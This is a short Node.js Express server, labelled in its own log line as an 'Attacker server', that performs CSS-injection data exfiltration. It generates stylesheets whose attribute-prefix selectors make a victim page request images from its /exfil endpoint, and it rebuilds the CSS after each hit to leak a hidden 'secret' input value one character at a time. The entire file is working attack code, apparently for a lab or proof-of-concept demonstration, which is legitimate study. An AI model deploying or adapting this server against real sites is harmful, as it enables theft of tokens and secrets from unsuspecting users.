let express = require("express");
let app = express();
let fs = require("fs");

const logPath = "./log.txt";
const stylePath = "./public/style.css";
const port = 8000;

const alphanumeric = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']

// CORS header
app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");                           
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, X-Custom-Header");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.header("Access-Control-Allow-Credentials", "true");
    res.header("Access-Control-Max-Age", "-1");
    next();
});

// endpoint for resetting server state to default
app.get("/clearall", function(request, response){
    let style = "";
    alphanumeric.forEach((c) => {
	style += `input[name="secret"][value^="${c}"]{background-image:url(http://127.0.0.1:8000/exfil?char=${c})}`; });
    fs.writeFile(stylePath, style, (err) => { if(err) console.log(err); });
    fs.writeFile(logPath, "", (err) => { if(err) console.log(err); });
    console.log("Log reset completed");
    response.end("Reset complete");
});

// public endpoint to serve style.css
app.use(express.static(__dirname + '/public'));

// endpoint for secret exfiltration
app.get("/exfil", function(request, response){
    let c = request.query.char;
    console.log(`Received ${c}`);
    // append the character to exploited secret
    fs.appendFile(logPath, c, (err) => { if(err) console.log(err); });
    response.sendStatus(200);
});

// endpoint for exploit_site.html script communication
app.get("/secret", function(request, response){
    // read current secret
    fs.readFile(logPath, function (err, secret) {
        if(secret){
	    let style = "";
	    alphanumeric.forEach((c) => {
		style += `input[name="secret"][value^="${secret}${c}"]{background-image:url(http://127.0.0.1:8000/exfil?char=${c})}`;
	    });
	    // write new stylesheet to exploit the next character in the secret
	    fs.writeFile(stylePath, style, (err) => {
		if(err) console.log(err);
		else{
		    console.log(`Stylesheet to exploit the character after ${secret} is written`);
		    response.end(secret);
		}
	    });
	}
        else
            response.end("");
    });
});

app.listen(port, () => {
    console.log(`Attacker server listening at port ${port}`);
});

